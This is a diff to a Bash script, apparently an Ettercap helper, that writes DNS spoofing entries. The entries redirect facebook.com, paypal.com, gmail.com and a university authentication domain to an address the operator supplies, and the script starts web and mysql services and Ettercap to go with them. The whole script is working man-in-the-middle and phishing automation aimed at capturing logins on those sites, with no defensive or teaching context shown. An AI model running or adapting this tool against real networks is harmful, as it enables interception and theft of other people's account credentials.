@@ -25,19 +25,19 @@ declare -r white="\e[1;37m"
 
 function welcome(){
 	
-sleep 0.3
+sleep 0.2
 printf "$green ________ $red __________ $blue __________ $yellow ________ $purple  ________  \n"
-sleep 0.3
+sleep 0.2
 printf "$green | ______|$red |___  ____|$blue |___  ____|$yellow | ______|$purple |  ____  | \n"
-sleep 0.3
+sleep 0.2
 printf "$green | |_____ $red     | |    $blue     | |	 $yellow  | |_____$purple  | |____| | \n"
-sleep 0.3
+sleep 0.2
 printf "$green | ______|$red     | |    $blue     | |	 $yellow  | ______|$purple |  ______| \n"
-sleep 0.3
+sleep 0.2
 printf "$green | |_____ $red     | |    $blue     | |	 $yellow  | |_____ $purple | |\_\     \n"
-sleep 0.3
+sleep 0.2
 printf "$green |_______|$red     |_|    $blue     |_|	 $yellow  |_______|$purple |_| \_\    \n"
-sleep 0.3
+sleep 0.2
 printf "$white														\n"
 
 }
@@ -48,7 +48,7 @@ function print_help(){
 	echo -e "${white}etter.sh -- Tool for Ettercap DNS file"
 	echo
 	echo "Usage : "
-	echo "			etter.sh [OPTIONS]"
+	echo "			etter [OPTIONS]"
 	echo
 	echo "[OPTIONS] :"
 	echo
@@ -60,7 +60,7 @@ function print_help(){
 	echo "	-e --ettercap		: start ettercap in graphical mode"
 	echo "	-h --help		: printf this help and exit"
 	echo
-	echo -e "Example : ${red}etter --ip 192.168.1.1 -s -e"
+	echo -e "Example : ${blue}etter --ip 192.168.1.1 -s -e"
 	echo
 }
 
@@ -74,6 +74,9 @@ function start_services(){
 	echo -e "$blue[Starting mysql service ...]"
 	service mysql start
 	echo -e "$green[MySql service started]"
+	echo
+	sleep 0.2
+	echo -e "$yellow[All services started]"
 	echo
 }
 
@@ -96,6 +99,62 @@ function stop_services(){
 	echo -e "$red[Stopping mysql service ...]"
 	service mysql stop
 	echo -e "$green[MySql service stopped]"
+	echo
+}
+
+function modif(){		
+	echo -e "$blue[Starting the modification of etter.dsn file]"
+
+	echo "*facebook.com		A	$addr/facebook.com" > $EtterPath
+	echo "*paypal.com			A	$addr/paypal.com" >> $EtterPath
+	echo "*gmail.com			A	$addr/gmail.com" >> $EtterPath
+	echo "*univ-tlemcen.dz		A	$addr/univ-tlemcen.dz" >> $EtterPath
+	echo >> $EtterPath
+	echo "*.univ-tlemcen.dz		A	$addr/univ-tlemcen.dz" >> $EtterPath
+	echo "*.facebook.com		A	$addr/facebook.com" >> $EtterPath
+	echo "*.paypal.com		A	$addr/paypal.com" >> $EtterPath
+	echo "*.gmail.com			A	$addr/gmail.com" >> $EtterPath
+	echo >> $EtterPath
+	echo "auth.univ-tlemcen.dz		A	$addr/univ-tlemcen.dz" >> $EtterPath
+	echo "www.facebook.com	A	$addr/facebook.com" >> $EtterPath
+	echo "www.paypal.com		A	$addr/paypal.com" >> $EtterPath
+	echo "www.gmail.com		A	$addr/gmail.com" >> $EtterPath
+
+	sleep 2
+	echo
+#########################################################################
+#	echo "*microsoft.com		A	$addr/bullshit.com" >> $EtterPath   #
+#########################################################################
+}
+
+function testx(){
+
+	if [ "$x" -eq 0 ]; then
+		echo -e "${white}Do you want to edit the file with '$addr' "
+		echo
+		echo -e "	${green}1- Yes"
+		echo -e "	${red}2- No"
+		echo
+		printf "${blue}Enter your choice : "
+		read choice
+		if [ "$choice" -eq 1 ]; then 
+			x=1
+		elif [ "$choice" -eq 2 ]; then
+			x=0
+		else 
+			echo -e "${red}Invalid Choice"
+			testx
+		fi
+	fi
+}
+
+function testip(){
+	if [[ "$addr" =~ (([01]{,1}[0-9]{1,2}|2[0-4][0-9]|25[0-5])\.([01]{,1}[0-9]{1,2}|2[0-4][0-9]|25[0-5])\.([01]{,1}[0-9]{1,2}|2[0-4][0-9]|25[0-5])\.([01]{,1}[0-9]{1,2}|2[0-4][0-9]|25[0-5]))$ ]]; then
+		echo
+	else
+		echo -e "${red}Invalid IP Adrress"
+		exit 1
+	fi
 	echo
 }
 
@@ -127,6 +186,7 @@ do
 			;;
 		-i | --ip)
 			addr="$2"
+			x=1
 			shift
 			;;
 		*)
@@ -146,9 +206,13 @@ if [ "$stop" = "1" ]; then
 	exit 1
 fi
 
+testip
+	
 ## -- WELCOME -- ##
 welcome
 ###################
+
+testx
 
 if [ "$service" = "1" ]; then
 	start_services
@@ -157,25 +221,11 @@ fi
 if [ "$ettercap" = "1" ]; then
 	start_ettercap
 fi
-			
-echo -e "$blue[Starting the modification of etter.dsn file]"
 
-echo "*facebook.com		A	$addr/facebook.com" > $EtterPath
-echo "*paypal.com			A	$addr/paypal.com" >> $EtterPath
-echo "*gmail.com			A	$addr/gmail.com" >> $EtterPath
-echo >> $EtterPath
-echo "*.facebook.com		A	$addr/facebook.com" >> $EtterPath
-echo "*.paypal.com		A	$addr/paypal.com" >> $EtterPath
-echo "*.gmail.com			A	$addr/gmail.com" >> $EtterPath
-echo >> $EtterPath
-echo "www.facebook.com	A	$addr/facebook.com" >> $EtterPath
-echo "www.paypal.com		A	$addr/paypal.com" >> $EtterPath
-echo "www.gmail.com		A	$addr/gmail.com" >> $EtterPath
+if [ "$x" -eq 1 ]; then
+	modif
+fi
 
-sleep 2
-echo
+sleep 0.3
 echo -e "$green[All Done !!]"
-
-#####################################################################
-#	echo "*microsoft.com		A	$addr/bullshit.com" > etter.dns	#
-#####################################################################
+exit 1
